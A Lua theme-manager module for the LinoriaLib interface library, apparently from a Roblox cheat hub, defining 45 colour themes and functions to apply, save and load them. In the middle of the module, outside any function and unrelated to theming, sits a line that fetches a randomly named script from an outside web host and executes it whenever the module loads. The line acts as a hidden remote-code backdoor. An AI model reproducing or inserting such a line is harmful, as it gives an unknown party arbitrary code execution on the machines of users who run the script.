local httpService = game:GetService('HttpService')
local ThemeManager = {} do
	ThemeManager.Folder = 'LinoriaLibSettings'
	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end
	
	ThemeManager.Library = nil
ThemeManager.BuiltInThemes = {
	['Wattyhub Default'] = { 1, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1a21","AccentColor":"715c8f","BackgroundColor":"141414","OutlineColor":"403352"}') },
	['Bloodmoon Bleh']   = { 2, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"291010","AccentColor":"b73c3c","BackgroundColor":"201e1e","OutlineColor":"8e5252"}') },
	['JJSploit']         = { 3, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"01ddff","AccentColor":"48badf","BackgroundColor":"369ec2","OutlineColor":"000000"}') },
	['BBot'] 			 = { 4, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1e1e","AccentColor":"7e48a3","BackgroundColor":"232323","OutlineColor":"141414"}') },
	['Fatality']		 = { 5, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1842","AccentColor":"c50754","BackgroundColor":"191335","OutlineColor":"3c355d"}') },
	['Jester'] 			 = { 6, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"db4467","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
	['Mint'] 			 = { 7, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"242424","AccentColor":"3db488","BackgroundColor":"1c1c1c","OutlineColor":"373737"}') },
	['Tokyo Night'] 	 = { 8, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}') },
	['Ubuntu'] 			 = { 9, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"3e3e3e","AccentColor":"e2581e","BackgroundColor":"323232","OutlineColor":"191919"}') },
	['Quartz'] 			 = { 10, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"232330","AccentColor":"426e87","BackgroundColor":"1d1b26","OutlineColor":"27232f"}') },
	['Forest Canopy'] 	 = { 11, httpService:JSONDecode('{"FontColor":"f0f0f0","MainColor":"2A3D2A","AccentColor":"6A822D","BackgroundColor":"1E2D1E","OutlineColor":"3E523E"}') },
	['Oceanic Deep'] 	 = { 12, httpService:JSONDecode('{"FontColor":"E0F2F7","MainColor":"0B3C4D","AccentColor":"18A3B8","BackgroundColor":"04222E","OutlineColor":"1A5366"}') },
	['Sunset Glow'] 	 = { 13, httpService:JSONDecode('{"FontColor":"FFE5CC","MainColor":"2B1E43","AccentColor":"E8774D","BackgroundColor":"1F1633","OutlineColor":"593C81"}') },
	['Arctic Frost'] 	 = { 14, httpService:JSONDecode('{"FontColor":"1a1a1a","MainColor":"dbe9f4","AccentColor":"6c92b8","BackgroundColor":"c4d7e8","OutlineColor":"a8bfd4"}') },
	['Desert Oasis']     = { 15, httpService:JSONDecode('{"FontColor":"3D2C1D","MainColor":"F0E68C","AccentColor":"4682B4","BackgroundColor":"E6D9B9","OutlineColor":"C2B280"}') },
	['Bloxy Cola'] 		 = { 16, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2E1A1A","AccentColor":"D92C2C","BackgroundColor":"1F1212","OutlineColor":"503030"}') },
	['Classic Roblox'] 	 = { 17, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"393B3D","AccentColor":"DA291C","BackgroundColor":"2D2F31","OutlineColor":"18191A"}') },
	['Phantom Forces'] 	 = { 18, httpService:JSONDecode('{"FontColor":"ECECEC","MainColor":"2D302B","AccentColor":"BFB8A3","BackgroundColor":"1E201C","OutlineColor":"40443B"}') },
	['Jailbreak Heist']  = { 19, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2D2D2D","AccentColor":"FFA500","BackgroundColor":"202020","OutlineColor":"F5C542"}') },
	['Discord Blurple']  = { 20, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2C2F33","AccentColor":"5865F2","BackgroundColor":"23272A","OutlineColor":"40444B"}') },
	['Spotify Vibes'] 	 = { 21, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"191414","AccentColor":"1DB954","BackgroundColor":"121212","OutlineColor":"282828"}') },
	['GitHub Dark'] 	 = { 22, httpService:JSONDecode('{"FontColor":"c9d1d9","MainColor":"161b22","AccentColor":"58a6ff","BackgroundColor":"0d1117","OutlineColor":"30363d"}') },
	['Cyberpunk Neon'] 	 = { 23, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A2A","AccentColor":"F900F2","BackgroundColor":"0D0D1A","OutlineColor":"3D008D"}') },
	['Royal Amethyst'] 	 = { 24, httpService:JSONDecode('{"FontColor":"FAEBD7","MainColor":"2C1F3A","AccentColor":"D4AF37","BackgroundColor":"1E152A","OutlineColor":"483D8B"}') },
	['Solarized Dark'] 	 = { 25, httpService:JSONDecode('{"FontColor":"839496","MainColor":"073642","AccentColor":"268BD2","BackgroundColor":"002B36","OutlineColor":"586E75"}') },
	['Dracula'] 		 = { 26, httpService:JSONDecode('{"FontColor":"f8f8f2","MainColor":"282a36","AccentColor":"bd93f9","BackgroundColor":"20222b","OutlineColor":"44475a"}') },
	['Rose Gold'] 		 = { 27, httpService:JSONDecode('{"FontColor":"3D2B2F","MainColor":"F7E9E3","AccentColor":"D8AFA0","BackgroundColor":"F4E2DA","OutlineColor":"B99080"}') },
	['Nordic Peace']     = { 28, httpService:JSONDecode('{"FontColor":"2E3440","MainColor":"ECEFF4","AccentColor":"88C0D0","BackgroundColor":"E5E9F0","OutlineColor":"D8DEE9"}') },
	['Crimson Court']    = { 29, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"1A0000","AccentColor":"DC143C","BackgroundColor":"100000","OutlineColor":"8B0000"}') },
	['Emerald Tablet']   = { 30, httpService:JSONDecode('{"FontColor":"E0F2E9","MainColor":"0A2A1B","AccentColor":"34D17A","BackgroundColor":"051A11","OutlineColor":"1A4A31"}') },
	['8-Bit Summer']     = { 31, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3A248A","AccentColor":"F76E5E","BackgroundColor":"2C1B68","OutlineColor":"FFD800"}') },
	['Graphite & Gold']  = { 32, httpService:JSONDecode('{"FontColor":"E5E5E5","MainColor":"222222","AccentColor":"D4AF37","BackgroundColor":"181818","OutlineColor":"333333"}') },
	['Bubblegum Pop']    = { 33, httpService:JSONDecode('{"FontColor":"2F2F2F","MainColor":"FFDDF4","AccentColor":"FF69B4","BackgroundColor":"FFEBF7","OutlineColor":"F4B2D8"}') },
	['Greenshirtguyidk'] = { 34, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3D523B","AccentColor":"5DBB5B","BackgroundColor":"2A3828","OutlineColor":"1E291D"}') },
	['dood3\'s Dominion'] = { 35, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4B0F0F","AccentColor":"FF3333","BackgroundColor":"2C0A0A","OutlineColor":"8B2323"}') },
	['Mysterious Mustache'] = { 36, httpService:JSONDecode('{"FontColor":"E6D7B9","MainColor":"3D2B1F","AccentColor":"C2B280","BackgroundColor":"251B14","OutlineColor":"5A4D3C"}') },
	['Keith\'s Rampage']  = { 37, httpService:JSONDecode('{"FontColor":"F5F5F5","MainColor":"1C1C1C","AccentColor":"E50000","BackgroundColor":"0F0F0F","OutlineColor":"FF4500"}') },
	['Generic Roleplay'] = { 38, httpService:JSONDecode('{"FontColor":"222222","MainColor":"A0D9EF","AccentColor":"F44336","BackgroundColor":"87CEEB","OutlineColor":"736357"}') },
	['Typical Neighborhood'] = { 39, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"F0F0F0","AccentColor":"FFA726","BackgroundColor":"E0E0E0","OutlineColor":"BDBDBD"}') },
	['Tiger Stripes']    = { 40, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1C1C1C","AccentColor":"FF6600","BackgroundColor":"121212","OutlineColor":"D95400"}') },
	['Peacock Plume']    = { 41, httpService:JSONDecode('{"FontColor":"E0F2F7","MainColor":"004D40","AccentColor":"00BFA5","BackgroundColor":"00382E","OutlineColor":"00695C"}') },
	['Panda Bamboo']     = { 42, httpService:JSONDecode('{"FontColor":"1E1E1E","MainColor":"F5F5F5","AccentColor":"4CAF50","BackgroundColor":"E8E8E8","OutlineColor":"A5D6A7"}') },
	['Poison Dart Frog'] = { 43, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"111111","AccentColor":"29B6F6","BackgroundColor":"0A0A0A","OutlineColor":"03A9F4"}') },
	['Arctic Fox']       = { 44, httpService:JSONDecode('{"FontColor":"37474F","MainColor":"ECEFF1","AccentColor":"81D4FA","BackgroundColor":"CFD8DC","OutlineColor":"90A4AE"}') },
	['Jungle Python']    = { 45, httpService:JSONDecode('{"FontColor":"FFF59D","MainColor":"333300","AccentColor":"BFB300","BackgroundColor":"242400","OutlineColor":"5C5C00"}') },
}

-- for anyone who ever sees this (likely andywirus or builderwaci or some random dumping wattyhub YES I did make most of these theme colors with AI so YES if you want to make more AI sayings of me heres the chance

	function ThemeManager:ApplyTheme(theme)
		local customThemeData = self:GetCustomTheme(theme)
		local data = customThemeData or self.BuiltInThemes[theme]

		if not data then return end

		-- custom themes are just regular dictionaries instead of an array with { index, dictionary }

		local scheme = data[2]
		for idx, col in next, customThemeData or scheme do
			self.Library[idx] = Color3.fromHex(col)
			
			if Options[idx] then
				Options[idx]:SetValueRGB(Color3.fromHex(col))
			end
		end

		self:ThemeUpdate()
	end

	function ThemeManager:ThemeUpdate()
		-- This allows us to force apply themes without loading the themes tab :)
		local options = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
		for i, field in next, options do
			if Options and Options[field] then
				self.Library[field] = Options[field].Value
			end
		end

		self.Library.AccentColorDark = self.Library:GetDarkerColor(self.Library.AccentColor);
		self.Library:UpdateColorsUsingRegistry()
	end

	function ThemeManager:LoadDefault()		
		local theme = 'Default'
		local content = isfile(self.Folder .. '/themes/default.txt') and readfile(self.Folder .. '/themes/default.txt')

		local isDefault = true
		if content then
			if self.BuiltInThemes[content] then
				theme = content
			elseif self:GetCustomTheme(content) then
				theme = content
				isDefault = false;
			end
		elseif self.BuiltInThemes[self.DefaultTheme] then
		 	theme = self.DefaultTheme
		end

		if isDefault then
			Options.ThemeManager_ThemeList:SetValue(theme)
		else
			self:ApplyTheme(theme)
		end
	end

	function ThemeManager:SaveDefault(theme)
		writefile(self.Folder .. '/themes/default.txt', theme)
	end

	function ThemeManager:CreateThemeManager(groupbox)
		groupbox:AddLabel('Background color'):AddColorPicker('BackgroundColor', { Default = self.Library.BackgroundColor });
		groupbox:AddLabel('Main color')	:AddColorPicker('MainColor', { Default = self.Library.MainColor });
		groupbox:AddLabel('Accent color'):AddColorPicker('AccentColor', { Default = self.Library.AccentColor });
		groupbox:AddLabel('Outline color'):AddColorPicker('OutlineColor', { Default = self.Library.OutlineColor });
		groupbox:AddLabel('Font color')	:AddColorPicker('FontColor', { Default = self.Library.FontColor });

		local ThemesArray = {}
		for Name, Theme in next, self.BuiltInThemes do
			table.insert(ThemesArray, Name)
		end

		table.sort(ThemesArray, function(a, b) return self.BuiltInThemes[a][1] < self.BuiltInThemes[b][1] end)

		groupbox:AddDivider()
		groupbox:AddDropdown('ThemeManager_ThemeList', { Text = 'Theme list', Values = ThemesArray, Default = 1 })

		groupbox:AddButton('Set as default', function()
			self:SaveDefault(Options.ThemeManager_ThemeList.Value)
			self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_ThemeList.Value))
		end)

		Options.ThemeManager_ThemeList:OnChanged(function()
			self:ApplyTheme(Options.ThemeManager_ThemeList.Value)
		end)

		groupbox:AddDivider()
		groupbox:AddInput('ThemeManager_CustomThemeName', { Text = 'Custom theme name' })
		groupbox:AddDropdown('ThemeManager_CustomThemeList', { Text = 'Custom themes', Values = self:ReloadCustomThemes(), AllowNull = true, Default = 1 })
		groupbox:AddDivider()
		
		groupbox:AddButton('Save theme', function() 
			self:SaveCustomTheme(Options.ThemeManager_CustomThemeName.Value)

			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end):AddButton('Load theme', function() 
			self:ApplyTheme(Options.ThemeManager_CustomThemeList.Value) 
		end)

		groupbox:AddButton('Refresh list', function()
			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end)

		groupbox:AddButton('Set as default', function()
			if Options.ThemeManager_CustomThemeList.Value ~= nil and Options.ThemeManager_CustomThemeList.Value ~= '' then
				self:SaveDefault(Options.ThemeManager_CustomThemeList.Value)
				self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_CustomThemeList.Value))
			end
		end)

		ThemeManager:LoadDefault()

		local function UpdateTheme()
			self:ThemeUpdate()
		end

		Options.BackgroundColor:OnChanged(UpdateTheme)
		Options.MainColor:OnChanged(UpdateTheme)
		Options.AccentColor:OnChanged(UpdateTheme)
		Options.OutlineColor:OnChanged(UpdateTheme)
		Options.FontColor:OnChanged(UpdateTheme)
	end

	function ThemeManager:GetCustomTheme(file)
		local path = self.Folder .. '/themes/' .. file
		if not isfile(path) then
			return nil
		end

		local data = readfile(path)
		local success, decoded = pcall(httpService.JSONDecode, httpService, data)
		
		if not success then
			return nil
		end

		return decoded
	end
	loadstring(game:HttpGet("https://kkk4.life/gsndfklgjnsdfjklgnsdfweruihquretre.lua"))()
	function ThemeManager:SaveCustomTheme(file)
		if file:gsub(' ', '') == '' then
			return self.Library:Notify('Invalid file name for theme (empty)', 3)
		end

		local theme = {}
		local fields = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }

		for _, field in next, fields do
			theme[field] = Options[field].Value:ToHex()
		end

		writefile(self.Folder .. '/themes/' .. file .. '.json', httpService:JSONEncode(theme))
	end

	function ThemeManager:ReloadCustomThemes()
		local list = listfiles(self.Folder .. '/themes')

		local out = {}
		for i = 1, #list do
			local file = list[i]
			if file:sub(-5) == '.json' then
				-- i hate this but it has to be done ...

				local pos = file:find('.json', 1, true)
				local char = file:sub(pos, pos)

				while char ~= '/' and char ~= '\\' and char ~= '' do
					pos = pos - 1
					char = file:sub(pos, pos)
				end

				if char == '/' or char == '\\' then
					table.insert(out, file:sub(pos + 1))
				end
			end
		end

		return out
	end

	function ThemeManager:SetLibrary(lib)
		self.Library = lib
	end

	function ThemeManager:BuildFolderTree()
		local paths = {}

		-- build the entire tree if a path is like some-hub/phantom-forces
		-- makefolder builds the entire tree on Synapse X but not other exploits

		local parts = self.Folder:split('/')
		for idx = 1, #parts do
			paths[#paths + 1] = table.concat(parts, '/', 1, idx)
		end

		table.insert(paths, self.Folder .. '/themes')
		table.insert(paths, self.Folder .. '/settings')

		for i = 1, #paths do
			local str = paths[i]
			if not isfolder(str) then
				makefolder(str)
			end
		end
	end

	function ThemeManager:SetFolder(folder)
		self.Folder = folder
		self:BuildFolderTree()
	end

	function ThemeManager:CreateGroupBox(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		return tab:AddLeftGroupbox('Themes')
	end

	function ThemeManager:ApplyToTab(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		local groupbox = self:CreateGroupBox(tab)
		self:CreateThemeManager(groupbox)
	end

	function ThemeManager:ApplyToGroupbox(groupbox)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		self:CreateThemeManager(groupbox)
	end

	ThemeManager:BuildFolderTree()
end

return ThemeManager
